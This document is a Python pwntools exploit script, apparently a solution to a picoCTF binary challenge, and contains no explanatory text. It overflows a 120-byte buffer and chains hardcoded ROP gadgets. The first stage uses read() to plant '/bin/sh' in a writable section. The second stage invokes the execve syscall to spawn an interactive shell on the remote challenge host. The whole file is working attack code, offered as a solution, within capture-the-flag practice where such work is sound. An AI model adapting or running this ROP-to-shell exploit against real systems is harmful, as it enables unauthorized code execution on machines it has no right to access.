#!/usr/bin/env python3

from pwn import *
from struct import pack
exe = ELF("./vuln")
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("jupiter.challenges.picoctf.org", 26735)

    return r


context.binary = exe
def main():
	r = conn()
	input()
	r.recvline()
	r.sendline(b'84')
	pop_rdi = 0x0000000000400696
	pop_rsi = 0x0000000000410ca3
	pop_rdx = 0x000000000044cc26
	pop_rax = 0x00000000004163f4
	syscall = 0x000000000040137c
	rw_section = 0x6bc5f0
	main_addr = 0x0000000000400c8c
	payload = b'A'*120
	payload += p64(pop_rdi) + p64(0)
	payload += p64(pop_rsi) + p64(rw_section)
	payload += p64(pop_rdx) + p64(9)
	payload += p64(exe.sym['read'])
	payload += p64(main_addr) 
	pause()
	r.sendlineafter(b'Name? ', payload)
	r.sendline(b'/bin/sh\0')
	pause()
	r.recvline()
	r.sendline(b'87')
	payload = b'A'*120
	payload += p64(pop_rdi) + p64(rw_section)
	payload += p64(pop_rsi) + p64(0)
	payload += p64(pop_rdx) + p64(0)
	payload += p64(pop_rax) + p64(0x3b)
	payload += p64(syscall) 
	r.sendlineafter(b'Name? ', payload)
	pause()
	r.interactive()
if __name__ == "__main__":
    main()
